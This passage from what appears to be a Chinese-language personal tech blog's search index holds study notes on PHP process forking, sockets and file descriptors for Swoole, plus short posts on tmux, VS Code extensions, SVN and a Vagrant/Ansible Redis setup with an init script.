是有差的…<br>但我看到還有一個答案，就是多執行緒可以等待結束在進行下一個動作</p>\n<p>詳細可看<a href=\"https://medium.com/@totoroLiu/program-process-thread-%E5%B7%AE%E7%95%B0-4a360c7345e5\" target=\"_blank\" rel=\"noopener\">Program/Process/Thread 差異 - Po-Ching Liu - Medium</a></p>\n<h4 id=\"fork-子程序\"><a href=\"#fork-子程序\" class=\"headerlink\" title=\"fork 子程序\"></a>fork 子程序</h4><p>前陣子看了鳥哥<a href=\"http://linux.vbird.org/linux_basic/0440processcontrol.php#parent_pid\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – 第十六章、程序管理與 SELinux 初探</a>這篇<br>看不太懂 <code>fork and exec：程序呼叫的流程</code><br>上課講到用 PHP 寫子程序</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$pid = pcntl_fork(); <span class=\"comment\">//在這裡開始產生程式的分岔   ##**</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($pid == <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">die</span>(<span class=\"string\">'無法產生子程序'</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ($pid) &#123;</span><br><span class=\"line\">     <span class=\"comment\">// 父程序會進入這裡</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">     <span class=\"comment\">// 子程序會進入這裡</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>做到上面<code>##**</code> 註解這行<br>它會做fork 主程序，也就是複製整份主程序記憶體所有程式內容<br>複製出來並不會跟主程序做關聯(會獨立出來)<br>變數更動不影響別的子程序和父程序</p>\n<p>但沒法用一般 kill 指令調<br>一般正常可以</p>\n<p><a href=\"https://www.php.net/manual/en/function.posix-setsid.php\" target=\"_blank\" rel=\"noopener\">PHP: posix_setsid - Manual</a></p>\n<h3 id=\"瞭解進程間通信的基本知識，如管道、UnixSocket、消息隊列、共享內存\"><a href=\"#瞭解進程間通信的基本知識，如管道、UnixSocket、消息隊列、共享內存\" class=\"headerlink\" title=\"瞭解進程間通信的基本知識，如管道、UnixSocket、消息隊列、共享內存\"></a>瞭解進程間通信的基本知識，如管道、UnixSocket、消息隊列、共享內存</h3><p>這個我就沒特別找了</p>\n<ul>\n<li><a href=\"https://blog.csdn.net/Swallow_he/article/details/84392285\" target=\"_blank\" rel=\"noopener\">TCP/UDP的接收緩衝區和發送緩衝區 - Swallow_he的博客 - CSDN博客</a></li>\n<li><a href=\"https://github.com/jasonGeng88/blog/blob/master/201705/MQ.md\" target=\"_blank\" rel=\"noopener\">一個故事告訴你什麼是消息隊列 · jasonGeng88/blog</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/37808566\" target=\"_blank\" rel=\"noopener\">进程间的通信方式（一）：共享内存 - 知乎</a><h2 id=\"SOCKET\"><a href=\"#SOCKET\" class=\"headerlink\" title=\"SOCKET\"></a>SOCKET</h2></li>\n</ul>\n<blockquote>\n<p>瞭解SOCKET的基本操作如accept/connect、send/recv、close、listen、bind<br>瞭解SOCKET的接收緩存區、發送緩存區、阻塞/非阻塞、超時等概念</p>\n</blockquote>\n<p>之前我有在 Java 書看到使用 socket 搭配執行緒做連線溝通<br>但沒有深入了解裡面原理</p>\n<blockquote>\n<p>你一直聽到人家在講 “sockets”，你可能也想知道這些是什麼東西。<br>好的，其實它們就是：＂利用標準 UNIX file descriptors（檔案描述符）與其它程式溝通的一種方式＂。<br><a href=\"http://beej-zhtw.netdpi.net/02-what-is-socket\" target=\"_blank\" rel=\"noopener\">02-何謂 Socket - Beej’s Guide to Network Programming 正體中文版</a></p>\n</blockquote>\n<h3 id=\"file-descriptors-fd\"><a href=\"#file-descriptors-fd\" class=\"headerlink\" title=\"file descriptors(fd)\"></a>file descriptors(fd)</h3><p>這邊有講到 <code>file descriptors</code> (fd) 後面會講到這個<br>簡單說 就是 0 標準輸出(stdout) 1 標準輸入(stdin) 2 標準錯誤(stderr)</p>\n<p>一些重要的I/O導向:</p>\n<blockquote>\n<p>>      重新導向並且先把檔案虧空(我真是敗家子:-))<br>>&gt;     把結果導向並且append到檔案後<br>&lt;      重新導向standard input<br>>&amp;n    把standard out丟給file descriptor n<br>&lt;&amp;n    從file descriptor n拿東西給standard in<br>>&amp;-    close standard out<br>\\&lt;\\&lt;\\text 把stanadard in導向，直到讀到text為止。</p>\n</blockquote>\n<p><a href=\"https://blog.xuite.net/tzeng015/twblog/113272117-File+descriptor%E8%88%87I%2FO%E5%B0%8E%E5%90%91\" target=\"_blank\" rel=\"noopener\">File descriptor與I/O導向 @ 程式專欄 :: 隨意窩 Xuite日誌</a></p>\n<p>fd更狂的應用可以看<a href=\"http://www.polish.url.tw/ech2/ech2.html\" target=\"_blank\" rel=\"noopener\">阿旺的 Linux 開竅手冊-file descriptor</a><br>我都不知道<code>/proc/xxxx/fd</code>可以看到所有應用程式 stdin / stdout / stderr 檔案</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 取得cmd 的 PID</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> $$;</span><br><span class=\"line\"><span class=\"built_in\">cd</span> /proc/$$/fd/</span><br><span class=\"line\">ls -la</span><br></pre></td></tr></table></figure>\n<p>可以看到標準輸入輸出會寫在哪裡<br>當然裡還還有更多東西，目前先提到這樣</p>\n<p>突然想到當初大學上 Linux 時候，老師講 Linux 裡面的東西都可以在檔案找到</p>\n<p><a href=\"http://inspire-future.blogspot.com/2016/12/file-descriptor.html\" target=\"_blank\" rel=\"noopener\">回憶の隨筆日記: 檔案描述符 (file descriptor) 簡單應用分析</a></p>\n<p><a href=\"https://blog.51cto.com/13097817/2054397\" target=\"_blank\" rel=\"noopener\">Socket-IO复用技术-SherryX-51CTO博客</a><br><a href=\"https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6\" target=\"_blank\" rel=\"noopener\">檔案描述符 - 維基百科，自由的百科全書</a></p>\n<h3 id=\"socket-跟-fd-關係\"><a href=\"#socket-跟-fd-關係\" class=\"headerlink\" title=\"socket 跟 fd 關係?\"></a>socket 跟 fd 關係?</h3><p>其實我以前看 socket 是傳訊息用的，想說他怎麼會跟 fd 有關係</p>\n<h4 id=\"bash-可以用-socket\"><a href=\"#bash-可以用-socket\" class=\"headerlink\" title=\"bash 可以用 socket\"></a>bash 可以用 socket</h4><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 開啟連線至 Google 網頁的 socket</span></span><br><span class=\"line\"><span class=\"built_in\">exec</span> 3&lt;&gt;/dev/tcp/www.google.com.tw/80</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 送出 HTTP 請求</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> -e <span class=\"string\">\"GET / HTTP/1.1\\n\\n\"</span> &gt;&amp;3</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 接收網頁內容，1 秒後自動停止接收資料</span></span><br><span class=\"line\">timeout 1 cat &lt;&amp;3</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 關閉輸入與輸出 socket</span></span><br><span class=\"line\"><span class=\"built_in\">exec</span> 3&lt;&amp;-</span><br><span class=\"line\"><span class=\"built_in\">exec</span> 3&gt;&amp;-</span><br></pre></td></tr></table></figure>\n<p>這時候可以去看 <code>/dev/xxx/fd/3</code> 可以看到這個檔案<br>不過我不確定別的程式語言建立 socket 會不會產生這個檔案??</p>\n<p>我使用 <code>php -S 0.0.0.0:80</code> 建立簡單的 Server<br>使用<code>ps aux | grep php</code> 看 PID<br>進入 <code>/proc/{PID}/fd/</code> 使用 <code>ls -l</code> 可以看到一些檔案參照 socket<br>但是怎麼知道是輸入還是輸出，我就沒深入研究<br>所以我研判是 socket 跟 fd 是有關係的(應該 = =a)</p>\n<p><a href=\"https://blog.gtwang.org/programming/bash-tutorial-open-tcp-udp-socket/\" target=\"_blank\" rel=\"noopener\">Bash 程式設計教學：開啟 TCP/UDP Socket 網路連線 - G. T. Wang</a><br><a href=\"https://blog.longwin.com.tw/2012/09/bash-shell-socket-connect-2012/\" target=\"_blank\" rel=\"noopener\">Bash shell 連接 Socket 寫法 | Tsung’s Blog</a></p>\n<p>我發現 zsh 不能實作，要在 bash 裡面一條一條執行才可以<br>用成 <code>xxx.sh</code> 不能跑，目前沒有深入找這個問題</p>\n<p>這讓我想以前 TCP 概論課程有用 <code>telnet</code> 實作 接收 yahoo 網頁<br>這上面範例應該是 Linux 方法!!</p>\n<h3 id=\"accept-connect、send-recv、close、listen、bind\"><a href=\"#accept-connect、send-recv、close、listen、bind\" class=\"headerlink\" title=\"accept/connect、send/recv、close、listen、bind\"></a>accept/connect、send/recv、close、listen、bind</h3><img src=\"/blog/2019/09/20/swoole-需要學習前了解一些東西整理小記/socket.png\" title=\"socket\">\n<p>簡單小記一些 function 作用<br><code>socket()</code> 建立 socket 用的 fd<br><code>bind()</code> socket() 傳回來的 fd 放在 bind 命名<br><code>listen()</code> 監聽 socket，但重頭戲在 accept，需要下 accept() 別人才能練近來<br><code>accept()</code> 接受別人連線，等 client 發 <code>connect</code><br><code>connect()</code> client 發起連線<br><code>send() , recv()</code> write read TCP??<br><code>sendto() , recvfrom()</code> write read UDP<br><code>close</code> 關閉連線</p>\n<p>首先，Server 會接收到 Client 資料，所以一開始 Server 會先做 <strong>read</strong>，確定收到資料才會做 write<br>簡單來講把這個想成 http 就好理解。話說 http 也是 socket o.&lt;</p>\n<p>想到這個我想想 socket 有沒有跟 https 憑證加密?<br><del>不過網路上查了一下，沒有看到。都是額外用 function library 加密</del><br><del>但也不是不能理解，畢竟 socket 介於 應用層 和 傳輸層中間</del><br>當然有找到使用 openssl ，不過沒有看到別的程式語言用 <a href=\"https://blog.csdn.net/qq_21111579/article/details/52134507\" target=\"_blank\" rel=\"noopener\">socket编程之openssl入门 - 我们的征途是星辰大海 - CSDN博客</a><br><a href=\"https://wp.huangshiyang.com/java%E5%AE%9E%E7%8E%B0-ssl%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81-socket\" target=\"_blank\" rel=\"noopener\">Java实现 SSL双向认证 Socket – Huang Shiyang</a><br><a href=\"https://morioh.com/p/4ee89beb93bd/tls-socket-client-server-in-nodejs\" target=\"_blank\" rel=\"noopener\">TLS Socket , client &amp; server in NodeJS - Morioh</a><br><a href=\"https://wiki.swoole.com/wiki/page/240.html\" target=\"_blank\" rel=\"noopener\">1.7.4 SSL隧道加密TCP-Server-Swoole-Swoole文档中心</a><br>看來還是真的有的…</p>\n<p>題外話:我好奇 socket 是網路7層哪一層，裡面有寫<a href=\"http://marklin-blog.logdown.com/posts/2366799\" target=\"_blank\" rel=\"noopener\">Socket 的哩哩扣扣 « Mark Lin Blog</a></p>\n<p>更多資訊<br><a href=\"http://zake7749.github.io/2015/03/17/SocketProgramming/\" target=\"_blank\" rel=\"noopener\">TCP Socket Programming 學習筆記 | 雷德麥的藏書閣</a><br><a href=\"https://legacy.gitbook.com/book/myliao/beej-s-guide-to-network-programming-chinese-zhtw/details\" target=\"_blank\" rel=\"noopener\">Beej’s Guide to Network Programming 正體中文版 · GitBook (Legacy)</a></p>\n<p>其實在看 io 複用一直在想為什麼要了解 socket<br>原來是大有關係，目前我猜測應該是 socket 並非最佳連線，所以才有 io 複用那些解決方案<br>到下面幾篇有很多都不是很了解，我盡量吸收</p>\n<h3 id=\"接收緩存區、發送緩存區、阻塞-非阻塞、超時等概念\"><a href=\"#接收緩存區、發送緩存區、阻塞-非阻塞、超時等概念\" class=\"headerlink\" title=\"接收緩存區、發送緩存區、阻塞/非阻塞、超時等概念\"></a>接收緩存區、發送緩存區、阻塞/非阻塞、超時等概念</h3><p><a href=\"https://www.jianshu.com/p/d3b6db70ad74\" target=\"_blank\" rel=\"noopener\">UDP Socket(套接字)——发送接收缓冲区 - 简书</a></p>\n<h2 id=\"IO复用\"><a href=\"#IO复用\" class=\"headerlink\" title=\"IO复用\"></a>IO复用</h2><p><a href=\"https://www.jianshu.com/p/dfd940e7fca2\" target=\"_blank\" rel=\"noopener\">聊聊IO多路复用之select、poll、epoll详解 - 簡書</a></p>\n<p>說真的我以為講到 IO 應該就會講到硬碟…<br>結果都是講 socket 東西<br>看來這個才是基礎…</p>\n<p>這一塊我不是很了解<br>簡單看到是在 epoll 比 select 還快<br>是用監聽事件觀念<br>這也是為什麼大家推使用 epoll 的 nginx<br><a href=\"https://xiaoyue26.github.io/2017/11/06/2017-11/epoll%E7%9B%B8%E5%85%B3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/\" target=\"_blank\" rel=\"noopener\">epoll相关基础知识 | 笔记本</a></p>\n<h3 id=\"同步、異步、阻塞、非阻塞\"><a href=\"#同步、異步、阻塞、非阻塞\" class=\"headerlink\" title=\"同步、異步、阻塞、非阻塞\"></a>同步、異步、阻塞、非阻塞</h3><p><a href=\"https://www.jianshu.com/p/aed6067eeac9\" target=\"_blank\" rel=\"noopener\">聊聊同步、异步、阻塞与非阻塞 - 簡書</a></p>\n<p>看裡面的內容，會覺得同步和阻塞不會分辨<br>我就突然想到 js 的 ajax 是異步，那這個會是阻塞還是不是阻塞?<br>答案是異步非阻塞<br><a href=\"https://medium.com/@mts40110/js-%E5%90%8C%E6%AD%A5-%E7%95%B0%E6%AD%A5-%E9%98%BB%E5%A1%9E-%E9%9D%9E%E9%98%BB%E5%A1%9E-29e1e1c0193e\" target=\"_blank\" rel=\"noopener\">JS 同步、異步、阻塞、非阻塞 - Sam - Medium</a><br>可以看上面連結<br>寫的還滿清楚的</p>\n<h3 id=\"LINUX-IO\"><a href=\"#LINUX-IO\" class=\"headerlink\" title=\"LINUX IO\"></a>LINUX IO</h3><p><a href=\"https://www.jianshu.com/p/486b0965c296\" target=\"_blank\" rel=\"noopener\">聊聊Linux 五种IO模型 - 簡書</a></p>\n<h2 id=\"應用\"><a href=\"#應用\" class=\"headerlink\" title=\"應用\"></a>應用</h2><p><a href=\"https://zhuanlan.zhihu.com/p/34279200\" target=\"_blank\" rel=\"noopener\">Swoole的简单运用 - 知乎</a></p>\n<p>看了這麼多還不是很了解，暫時整理到這邊…orz</p>\n<p><strong>2019-10-26</strong></p>\n<p>課程小記</p>\n<ul>\n<li>Swoole Server </li>\n<li>HTTP/Websocket Server</li>\n<li>Task 異步任務<br>這一快很像 MQ，但要可靠可以用</li>\n<li>Timer 定時器</li>\n<li>Memory 模組<br>講者有提到這邊可以做 Memory Cache<br>Memory Cache 可在 Redis 前面可做緩衝<br>減輕Redis 負擔<br>剛好網路上有找到 Github <a href=\"https://github.erp.pub/swooliy/memory-cache\" target=\"_blank\" rel=\"noopener\">GitHub - swooliy/memory-cache: Memory Cache base on swoole</a></li>\n<li><p>Process</p>\n</li>\n<li><p>Coroutine</p>\n</li>\n</ul>\n<p>更新 swoole 程式必須要重啟?<br>需要。但現在有 Docker , K8s 機器所以做更新程式，服務不會中斷<br>但是 websocket 還是會斷<br>所以必須要做 websocket 重新連線機制</p>\n<p>Websocket 要做 load balance<br>需要做一個 main server 關聯所有 Websocket Server 溝通橋梁<br><del>所有近來不是透過 main server 去做送</del><br>而是自動直接 load balance 進去到 Websocket Server<br>要透過發送訊息是 main server 做發送給所有 Websocket Server<br>去做實作</p>\n<p>main Server 雖然沒有講到要用什麼<br>但我覺得 MQ(RabbitMQ) 用在這上面也是非常不錯的方法</p>\n<p>課程有提到<br>socket.io 跟 websocket 不太一樣<br>socket.io 有對非支援 websocket 瀏覽器的處理</p>\n<p>f</p>\n","categories":["PHP"],"tags":["php","swoole"]},{"title":"tmux 控制終端機好工具","url":"/blog/2020/01/13/tmux-%E6%8E%A7%E5%88%B6%E7%B5%82%E7%AB%AF%E6%A9%9F%E5%A5%BD%E5%B7%A5%E5%85%B7/","content":"<p>之前就想記錄 tmux 跟 screen<br>但這兩個不熟<br>久而久之沒用，之前指令就忘記一大辦<br>最近又稍微用了一下 tmux<br>才突然想到之前就想紀錄 tmux</p>\n<a id=\"more\"></a>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">tmux </span><br><span class=\"line\">tmux a -t _number_</span><br><span class=\"line\">tmux at</span><br><span class=\"line\">tmux <span class=\"built_in\">kill</span>-server</span><br></pre></td></tr></table></figure>\n<p>tmux 裡面可以操作指令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 先按 Ctrl + b 再 d</span><br><span class=\"line\">Ctrl+ b 和 d</span><br><span class=\"line\">Ctrl+ b 和 c</span><br><span class=\"line\">Ctrl+ b 和 w</span><br><span class=\"line\">Ctrl+ b 和 n</span><br><span class=\"line\">Ctrl+ b 和 p</span><br><span class=\"line\">Ctrl+ b 和 %</span><br><span class=\"line\">Ctrl+ b 和 /</span><br><span class=\"line\">Ctrl+ b 和 &quot;</span><br><span class=\"line\">Ctrl+ b 和 _方向鍵_</span><br><span class=\"line\">Ctrl+ b 和 Ctrl+_方向鍵_</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://chunchaichang.blogspot.com/2014/01/tmux-terminal-multiplexer.html\" target=\"_blank\" rel=\"noopener\">Tech黑手 - 工作雜記: TMUX (Terminal MUltipleXer )</a><br><a href=\"https://larrylu.blog/tmux-33a24e595fbc\" target=\"_blank\" rel=\"noopener\">終端機 session 管理神器 — tmux - Larry・Blog</a><br><a href=\"https://andyyou.github.io/2017/11/27/tmux-notes/\" target=\"_blank\" rel=\"noopener\">tmux 快速入門筆記 | DEVLOG of andyyou</a></p>\n","categories":["Linux"],"tags":["tmux"]},{"title":"vscode ES6 template literal HTML亮字提示","url":"/blog/2018/09/27/vscode-ES6-template-literal-HTML%E4%BA%AE%E5%AD%97%E6%8F%90%E7%A4%BA/","content":"<p>最近使用vscode練vuejs，還沒使用<code>vue cli</code><br>想說現在公司專案碰vue cli，微乎其微<br>但是使用單存vuejs，我覺得還有機會<br>當然要先熟悉web一下</p>\n<a id=\"more\"></a>\n<p>現在我寫程式都是使用vscode<br>但最近寫vuejs template沒有變色文字<br>真的好不習慣，又很傷眼睛</p>\n<p>所以就找了一下vscode有沒有好用的套件</p>\n<h2 id=\"es6-string-html\"><a href=\"#es6-string-html\" class=\"headerlink\" title=\"es6-string-html\"></a>es6-string-html</h2><img src=\"/blog/2018/09/27/vscode-ES6-template-literal-HTML亮字提示/1.jpg\">\n<p>只要前面帶<code>/*html*/</code>，就有完美亮點提示</p>\n<p>完美<br>剛好平常php專案可以考慮這樣用<br>現在不用考慮IE8了XD</p>\n","categories":["實用工具"],"tags":["vscode"]},{"title":"vscode 套件調整PHP code style 使用記錄","url":"/blog/2018/07/18/vscode-%E5%A5%97%E4%BB%B6%E8%AA%BF%E6%95%B4PHP-code-style-%E4%BD%BF%E7%94%A8%E8%A8%98%E9%8C%84/","content":"<ul>\n<li>phpfmt<ul>\n<li><a href=\"https://www.eertime.com/archives/86.html\" target=\"_blank\" rel=\"noopener\">sublime text3 phpfmt插件使用 - eerTime</a></li>\n</ul>\n</li>\n<li>vscode-php-cs-fixer<ul>\n<li><a href=\"http://codefun.tw/2017/10/23/2017102302-vscode-extension-php-cs-fixer/\" target=\"_blank\" rel=\"noopener\">在 vs code 使用 php cs fixer 進行 coding style 的格式修正 | Codefun</a></li>\n</ul>\n</li>\n<li>php-cs-fixer<ul>\n<li><a href=\"https://my.oschina.net/dingdayu/blog/792497\" target=\"_blank\" rel=\"noopener\">使用 PHP-CS-Fixer 自动规范化你的 PHP 代码 - dingdayu的个人空间 - 开源中国</a></li>\n</ul>\n</li>\n</ul>\n<p>不知道為什麼裝phpfmt，我vscode不用設定什麼東西就能跑了<br>後來決定用這個XD<br>設定方式也很方便</p>\n<a id=\"more\"></a>\n<p>沒試用的套件</p>\n<ul>\n<li>sample-vscode-php-cs-fixer</li>\n<li>PHP Formatter</li>\n</ul>\n<p><a href=\"https://www.cnblogs.com/huangtailang/p/6604124.html\" target=\"_blank\" rel=\"noopener\">vscode 中使用php-cs-fixer和PHP Formatter 插件规范化PHP代码 - HTL - 博客园</a></p>\n<p>可先在作業系統環境path加入php執形資料夾<br>下載php解壓縮出來，設定作業環境的path</p>\n<p>公司PHP設定</p>\n<ul>\n<li>TRUE、FALSE、NULL 要大寫  // psr2檢查要關掉</li>\n<li>if class switch 需要換行  // AllmanStyleBraces<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;phpfmt.passes&quot;: [&quot;AllmanStyleBraces&quot;],</span><br><span class=\"line\">&quot;phpfmt.psr2&quot;: false,</span><br><span class=\"line\">&quot;[php]&quot;: &#123;</span><br><span class=\"line\">  &quot;editor.formatOnSave&quot;: true</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><code>&quot;editor.formatOnSave&quot;: true</code><br>vscode<code>檔案編輯頁面</code>還原git好像會有問題……<br>但影響不大……<br><del>這篇好像沒有寫什麼重點   呵呵= =|||</del></p>\n","categories":["實用工具"],"tags":["vscode","PHP","PSR"]},{"title":"vscode使用svn做版控簡單筆記","url":"/blog/2018/08/20/vscode%E4%BD%BF%E7%94%A8svn%E5%81%9A%E7%89%88%E6%8E%A7%E7%B0%A1%E5%96%AE%E7%AD%86%E8%A8%98/","content":"<p>由於公司舊專案都是用SVN去開發的<br>但最近…接觸的案子都是舊專案<br>平常看這次修改差異都要切到TortoiseSVN<br>但今天鼓起勇氣嘗試<a href=\"https://marketplace.visualstudio.com/items?itemName=johnstoncode.svn-scm\" target=\"_blank\" rel=\"noopener\">SVN - Visual Studio Marketplace</a><br>在此做個筆記</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>If you use TortoiseSVN, make sure the option Command Line Tools is checked during installation and C:\\Program Files\\TortoiseSVN\\bin is available in PATH.</p>\n</blockquote>\n<p>想說我安裝目錄也在相同路徑，環境變數也有設定PATH<br>就直接安裝，裝完重啟竟然跑出沒有SVN訊息….</p>\n<p>覺得怪怪的，有趣命令提示字元打<code>svn</code>，沒有反應<br>在想是不是沒安裝<code>command line</code>東西，試著重新安裝<br>果然有command line選項</p>\n<img src=\"/blog/2018/08/20/vscode使用svn做版控簡單筆記/vscode_svn.jpg\" title=\"TortoiseSVN安裝選單\">\n<p>然後vscode操作svn版本操作介面跟git一樣<br>只能說vscode太神了</p>\n<p>我所有編輯器都混著用<br>從Sublime Text70% 到vscode 30%<br>現在到vscode 80%到Sublime Text 20%</p>\n<p>不過大量文字編輯我還是習慣用Sublime Text</p>\n<p><a href=\"https://marketplace.visualstudio.com/items?itemName=beaugust.blamer-vs\" target=\"_blank\" rel=\"noopener\">SVN Gutter - Visual Studio Marketplace</a><br>好像類似gitlens東西<br>不過有空再試驗看看</p>\n","categories":["實用工具"],"tags":["vscode","svn"]},{"title":"vagrant 搭配使用 ansible 和 docker 架設 redis 小記","url":"/blog/2020/02/15/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/","content":"<p>常常我們需要做布署安裝<br>多台可能需要<br>最近看到 vagrant 可以搭配 ansible 使用<br>網路上隨便找一個範例小記<br>意外發現 <code>/var/run</code> 一些程式設定方法</p>\n<a id=\"more\"></a>\n<h2 id=\"vagrant-使用-ansible-安裝-redis\"><a href=\"#vagrant-使用-ansible-安裝-redis\" class=\"headerlink\" title=\"vagrant 使用 ansible 安裝 redis\"></a>vagrant 使用 ansible 安裝 redis</h2><p><a href=\"https://github.com/mikeblum/redis-playbook\" target=\"_blank\" rel=\"noopener\">mikeblum/redis-playbook: Ansible playbook for deploying, securing, and optimizing a Redis instance</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/mikeblum/redis-playbook.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> redis-playbook</span><br><span class=\"line\"><span class=\"comment\"># image 可以改成用過的</span></span><br><span class=\"line\">vagrant up</span><br></pre></td></tr></table></figure>\n<p>這時候 redis 都是可以用的<br>但我發現 vagrant reload 重開機後<br>redis 竟然開不起來</p>\n<h3 id=\"var-run-引發-redis-無法啟動\"><a href=\"#var-run-引發-redis-無法啟動\" class=\"headerlink\" title=\"/var/run 引發 redis 無法啟動\"></a>/var/run 引發 redis 無法啟動</h3><p><code>/var/run</code> 裡面的 redis 重開機竟然就不見了<br>經過 Google 發現由於 ubuntu 預設 /var/run 是用 tmpfs<br>所以重開機資料就不會在</p>\n<p>但我發現裡面有 docker ,mysqld…，權限也不是 root<br>這又是從哪裡來的呢?</p>\n<p>後來追查發現 <code>/etc/init/</code> 裡面 docker.conf 和 mysql.conf 有做產生檔案改權限相關動作</p>\n<blockquote>\n<p>題外話不過那 <code>/var/log</code> 是怎麼改的?<br>這也是不錯的問題</p>\n</blockquote>\n<p>但是我嘗試使用 apt install redis<br>發現 /etc/init 沒有我要的<br>後來發現 /etc/init.d/ 裡面有相關 redis 設定</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">###########################</span></span><br><span class=\"line\"><span class=\"comment\">#chkconfig: 2345 10 90</span></span><br><span class=\"line\"><span class=\"comment\">#description: Start and Stop redis</span></span><br><span class=\"line\">PATH=/usr/<span class=\"built_in\">local</span>/bin:/sbin:/usr/bin:/bin</span><br><span class=\"line\"> </span><br><span class=\"line\">REDISPORT=6379</span><br><span class=\"line\">EXEC=/usr/<span class=\"built_in\">local</span>/bin/redis-server</span><br><span class=\"line\">REDIS_CLI=/usr/<span class=\"built_in\">local</span>/bin/redis-cli</span><br><span class=\"line\"><span class=\"comment\">##判断redis是否启动了</span></span><br><span class=\"line\">PIDFILE=/var/run/redis_6379.pid</span><br><span class=\"line\">CONF=<span class=\"string\">\"/etc/redis.conf\"</span></span><br><span class=\"line\">PASSWORD=$(cat <span class=\"variable\">$CONF</span>|grep <span class=\"string\">'^\\s*requirepass'</span>|awk <span class=\"string\">'&#123;print $2&#125;'</span>|sed <span class=\"string\">'s/\"//g'</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">\"<span class=\"variable\">$1</span>\"</span> <span class=\"keyword\">in</span></span><br><span class=\"line\">    start)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> [ -f <span class=\"variable\">$PIDFILE</span> ]</span><br><span class=\"line\">        <span class=\"keyword\">then</span></span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PIDFILE</span> exists, process is already running or crashed\"</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"string\">\"Starting Redis server...\"</span></span><br><span class=\"line\">                <span class=\"variable\">$EXEC</span> <span class=\"variable\">$CONF</span></span><br><span class=\"line\">        <span class=\"keyword\">fi</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> [ <span class=\"string\">\"$?\"</span>=<span class=\"string\">\"0\"</span> ]</span><br><span class=\"line\">        <span class=\"keyword\">then</span></span><br><span class=\"line\">              <span class=\"built_in\">echo</span> <span class=\"string\">\"Redis is running...\"</span></span><br><span class=\"line\">        <span class=\"keyword\">fi</span></span><br><span class=\"line\">        ;;</span><br><span class=\"line\">    stop)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> [ ! -f <span class=\"variable\">$PIDFILE</span> ]</span><br><span class=\"line\">        <span class=\"keyword\">then</span></span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PIDFILE</span> does not exist, process is not running\"</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">                PID=$(cat <span class=\"variable\">$PIDFILE</span>)</span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"string\">\"Stopping ...\"</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ -z <span class=\"variable\">$PASSWORD</span> ]</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"variable\">$REDIS_CLI</span> -p <span class=\"variable\">$REDISPORT</span> shutdown</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"variable\">$REDIS_CLI</span> -a <span class=\"variable\">$PASSWORD</span> -p <span class=\"variable\">$REDISPORT</span> shutdown</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\">                <span class=\"comment\">#$REDIS_CLI -p $REDISPORT SHUTDOWN</span></span><br><span class=\"line\">                <span class=\"keyword\">while</span> [ -x <span class=\"variable\">$&#123;PIDFILE&#125;</span> ]</span><br><span class=\"line\">               <span class=\"keyword\">do</span></span><br><span class=\"line\">                    <span class=\"built_in\">echo</span> <span class=\"string\">\"Waiting for Redis to shutdown ...\"</span></span><br><span class=\"line\">                    sleep 1</span><br><span class=\"line\">                <span class=\"keyword\">done</span></span><br><span class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"string\">\"Redis stopped\"</span></span><br><span class=\"line\">        <span class=\"keyword\">fi</span></span><br><span class=\"line\">        ;;</span><br><span class=\"line\">   restart|force-reload)</span><br><span class=\"line\">        <span class=\"variable\">$&#123;0&#125;</span> stop</span><br><span class=\"line\">        <span class=\"variable\">$&#123;0&#125;</span> start</span><br><span class=\"line\">        ;;</span><br><span class=\"line\">  *)</span><br><span 